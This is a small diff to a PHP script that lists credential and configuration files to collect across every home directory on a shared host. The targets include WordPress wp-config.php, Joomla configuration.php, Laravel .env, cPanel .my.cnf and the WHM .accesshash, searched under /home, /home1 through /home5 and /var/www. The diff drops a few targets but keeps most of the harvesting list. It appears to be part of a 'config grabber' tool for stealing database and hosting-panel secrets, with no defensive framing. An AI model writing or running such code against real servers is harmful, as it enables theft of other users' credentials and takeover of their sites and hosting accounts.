@@ -247,14 +247,12 @@ $user_count = count($all_users);
             ['public_html/wp-config.php', 'wordpress', 'wordpress'],
             ['public_html/configuration.php', 'joomla', 'joomla'],
             ['public_html/.env', 'laravel', 'laravel'],
-            ['public_html/app/etc/env.php', 'magento', 'general'],
-            ['public_html/application/config/database.php', 'codeigniter', 'general'],
-            ['public_html/config.php', 'opencart', 'general'],
+            
             
             // Server Configs (biasanya di root home)
             ['.my.cnf', 'cpanel', 'cpanel'],
             ['.accesshash', 'whm', 'whm'],
-            ['.bash_history', 'bash', 'general']
+            
         ];
 
         $bases = ['/home', '/home1', '/home2', '/home3', '/home4', '/home5', '/var/www'];
